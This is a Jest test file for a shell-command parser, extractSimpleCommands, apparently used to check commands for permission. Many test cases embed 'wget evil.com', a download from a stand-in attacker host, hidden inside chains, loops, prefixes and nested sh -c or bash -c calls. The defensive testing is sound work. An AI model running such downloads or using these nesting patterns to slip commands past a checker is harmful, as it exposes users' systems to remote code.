import { extractSimpleCommands } from '../extractSimpleCommands.js';

describe('extractSimpleCommands', () => {
  describe('simple commands', () => {
    it.each([
      { commandLine: 'echo hello world', expected: ['echo hello world'] },
      { commandLine: "echo 'hello world", expected: ["echo 'hello world"] },
      { commandLine: 'wget evil.com', expected: ['wget evil.com'] },
      { commandLine: 'git status', expected: ['git status'] },
      { commandLine: 'rm file.txt', expected: ['rm file.txt'] },
      { commandLine: 'echo grep', expected: ['echo grep'] },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('complex commands', () => {
    it.each([
      {
        commandLine: 'echo hello && wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'echo hello; wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'echo hello && echo world',
        expected: ['echo hello', 'echo world'],
      },
      {
        commandLine: 'echo hello | wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'echo hello || wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('environment variables', () => {
    it.each([
      { commandLine: 'TEST=1', expected: [] },
      { commandLine: 'FOO=bar BAZ=qux', expected: [] },
      { commandLine: 'FOO=1; BAR=2', expected: [] },
      { commandLine: 'FOO=bar && echo hi', expected: ['echo hi'] },
      { commandLine: 'FOO=bar echo hello', expected: ['echo hello'] },
      {
        commandLine: 'FOO=bar BAR=baz echo hello',
        expected: ['echo hello'],
      },
      { commandLine: 'foo=bar echo hello', expected: ['echo hello'] },
      { commandLine: 'FOO=bar wget evil.com', expected: ['wget evil.com'] },
      {
        commandLine: 'FOO=bar echo hello && wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'echo hello && FOO=bar wget evil.com',
        expected: ['echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'FOO=bar echo hello && BAR=baz echo world',
        expected: ['echo hello', 'echo world'],
      },
      {
        commandLine: 'FOO=bar wget evil.com && BAR=baz rm file.txt',
        expected: ['wget evil.com', 'rm file.txt'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('control structures - while', () => {
    it.each([
      {
        commandLine: 'while true; do echo hello; done',
        expected: ['true', 'echo hello'],
      },
      {
        commandLine: 'while true; do wget evil.com; done',
        expected: ['true', 'wget evil.com'],
      },
      {
        commandLine: 'while grep pattern file.txt; do echo found; done',
        expected: ['grep pattern file.txt', 'echo found'],
      },
      {
        commandLine: 'while [ -f /tmp/file ]; do echo waiting; done',
        expected: ['echo waiting'],
      },
      {
        commandLine: 'while true; do echo hello; echo world; done',
        expected: ['true', 'echo hello', 'echo world'],
      },
      {
        commandLine: 'while true; do echo hello && wget evil.com; done',
        expected: ['true', 'echo hello', 'wget evil.com'],
      },
      {
        commandLine: 'while true; do echo hello && echo world; done',
        expected: ['true', 'echo hello', 'echo world'],
      },
      {
        commandLine: 'while FOO=bar grep pattern file.txt; do echo found; done',
        expected: ['grep pattern file.txt', 'echo found'],
      },
      {
        commandLine: 'while true; do FOO=bar echo hello; done',
        expected: ['true', 'echo hello'],
      },
      {
        commandLine: 'echo start && while true; do echo loop; done',
        expected: ['echo start', 'true', 'echo loop'],
      },
      {
        commandLine: 'echo start && while true; do wget evil.com; done',
        expected: ['echo start', 'true', 'wget evil.com'],
      },
      {
        commandLine: 'while true; do echo loop; done && wget evil.com',
        expected: ['true', 'echo loop', 'wget evil.com'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('control structures - for', () => {
    it.each([
      {
        commandLine: 'for i in a b c; do echo $i; done',
        expected: ['echo $i'],
      },
      {
        commandLine: 'for i in a b c; do wget evil.com; done',
        expected: ['wget evil.com'],
      },
      {
        commandLine: 'for i in 1 2 3; do echo $i; echo done; done',
        expected: ['echo $i', 'echo done'],
      },
      {
        commandLine: 'for i in 1 2 3; do echo $i && wget evil.com; done',
        expected: ['echo $i', 'wget evil.com'],
      },
      {
        commandLine: 'for i in 1 2 3; do echo $i && echo world; done',
        expected: ['echo $i', 'echo world'],
      },
      {
        commandLine: 'for i in a b c; do FOO=bar echo $i; done',
        expected: ['echo $i'],
      },
      {
        commandLine: 'echo start && for i in 1 2; do echo $i; done',
        expected: ['echo start', 'echo $i'],
      },
      {
        commandLine: 'echo start && for i in 1 2; do wget evil.com; done',
        expected: ['echo start', 'wget evil.com'],
      },
      {
        commandLine: 'for i in 1 2; do echo $i; done && echo end',
        expected: ['echo $i', 'echo end'],
      },
      {
        commandLine: 'for i in 1 2; do echo $i; done && wget evil.com',
        expected: ['echo $i', 'wget evil.com'],
      },
      {
        commandLine: 'for ((i=0; i<10; i++)); do echo $i; done',
        expected: ['echo $i'],
      },
      {
        commandLine: 'for ((i=0; i<10; i++)); do wget evil.com; done',
        expected: ['wget evil.com'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('time prefix', () => {
    it.each([
      { commandLine: 'time echo hello', expected: ['echo hello'] },
      { commandLine: 'time wget evil.com', expected: ['wget evil.com'] },
      {
        commandLine: 'time FOO=bar echo hello',
        expected: ['echo hello'],
      },
      {
        commandLine: 'FOO=bar time echo hello',
        expected: ['echo hello'],
      },
      {
        commandLine: 'time FOO=bar wget evil.com',
        expected: ['wget evil.com'],
      },
      {
        commandLine: 'while true; do time echo hello; done',
        expected: ['true', 'echo hello'],
      },
      {
        commandLine: 'while true; do time wget evil.com; done',
        expected: ['true', 'wget evil.com'],
      },
      {
        commandLine: 'for i in 1 2; do time echo $i; done',
        expected: ['echo $i'],
      },
      {
        commandLine: 'for i in 1 2; do time wget evil.com; done',
        expected: ['wget evil.com'],
      },
      {
        commandLine: 'echo start && time echo hello',
        expected: ['echo start', 'echo hello'],
      },
      {
        commandLine: 'echo start && time wget evil.com',
        expected: ['echo start', 'wget evil.com'],
      },
      {
        commandLine: 'time echo hello && echo end',
        expected: ['echo hello', 'echo end'],
      },
      {
        commandLine: 'time wget evil.com && echo end',
        expected: ['wget evil.com', 'echo end'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('rtk prefix', () => {
    it.each([
      { commandLine: 'rtk echo hello', expected: ['echo hello'] },
      { commandLine: 'rtk wget evil.com', expected: ['wget evil.com'] },
      { commandLine: 'rtk --version', expected: ['rtk --version'] },
      { commandLine: 'rtk --help', expected: ['rtk --help'] },
      {
        commandLine: 'rtk FOO=bar echo hello',
        expected: ['echo hello'],
      },
      {
        commandLine: 'FOO=bar rtk echo hello',
        expected: ['echo hello'],
      },
      {
        commandLine: 'rtk FOO=bar wget evil.com',
        expected: ['wget evil.com'],
      },
      {
        commandLine: 'while true; do rtk echo hello; done',
        expected: ['true', 'echo hello'],
      },
      {
        commandLine: 'while true; do rtk wget evil.com; done',
        expected: ['true', 'wget evil.com'],
      },
      {
        commandLine: 'for i in 1 2; do rtk echo $i; done',
        expected: ['echo $i'],
      },
      {
        commandLine: 'for i in 1 2; do rtk wget evil.com; done',
        expected: ['wget evil.com'],
      },
      {
        commandLine: 'echo start && rtk echo hello',
        expected: ['echo start', 'echo hello'],
      },
      {
        commandLine: 'echo start && rtk wget evil.com',
        expected: ['echo start', 'wget evil.com'],
      },
      {
        commandLine: 'rtk echo hello && echo end',
        expected: ['echo hello', 'echo end'],
      },
      {
        commandLine: 'rtk wget evil.com && echo end',
        expected: ['wget evil.com', 'echo end'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });

  describe('nested complex combinations', () => {
    it.each([
      // for + env vars + xargs + sh -c
      {
        commandLine:
          "for i in 1 2; do FOO=bar find . | xargs sh -c 'grep $i && rm file'; done",
        expected: ['find .', 'grep $i', 'rm file'],
      },
      // while + time + xargs with complex command
      {
        commandLine:
          "while true; do time echo files | xargs 'cat file && wget evil.com'; done",
        expected: ['true', 'echo files', 'cat file', 'wget evil.com'],
      },
      // sh -c inside for with env vars and time
      {
        commandLine:
          "for ((i=0; i<10; i++)); do ENV=test time sh -c 'echo $i && wget evil.com'; done",
        expected: ['echo $i', 'wget evil.com'],
      },
      // xargs + sh -c + env vars + time in pipeline
      {
        commandLine:
          "find . | ENV=prod xargs sh -c 'time grep pattern && wget evil.com'",
        expected: ['find .', 'grep pattern', 'wget evil.com'],
      },
      // Deeply nested: while + for + sh -c + xargs + env + time
      {
        commandLine:
          "while true; do for f in *.txt; do echo $f | FOO=bar time xargs sh -c 'cat file && wget evil.com'; done; done",
        expected: ['true', 'echo $f', 'cat file', 'wget evil.com'],
      },
      // Multiple sh -c in pipeline with env vars
      {
        commandLine:
          "ENV=a sh -c 'echo start' | ENV=b sh -c 'grep ok && wget evil.com'",
        expected: ['echo start', 'grep ok', 'wget evil.com'],
      },
      // xargs with sh -c containing while loop
      {
        commandLine:
          "find . | xargs sh -c 'while read line; do echo $line && wget evil.com; done'",
        expected: ['find .', 'read line', 'echo $line', 'wget evil.com'],
      },
      // Complex AndOr with nested sh -c and xargs
      {
        commandLine:
          "echo start && sh -c 'find . | xargs grep pattern' && wget evil.com",
        expected: ['echo start', 'find .', 'grep pattern', 'wget evil.com'],
      },
      // bash -c calling zsh -c (acceptance: inner commands correctly extracted)
      {
        commandLine: 'bash -c \'zsh -c "echo hello && echo world"\'',
        expected: ['echo hello', 'echo world'],
      },
      // bash -c calling zsh -c (error: malicious command surfaces through nested shells)
      {
        commandLine: 'bash -c \'zsh -c "echo start && wget evil.com"\'',
        expected: ['echo start', 'wget evil.com'],
      },
    ])('$commandLine', ({ commandLine, expected }) => {
      const actual = extractSimpleCommands(commandLine);
      expect(actual).toEqual(expected);
    });
  });
});
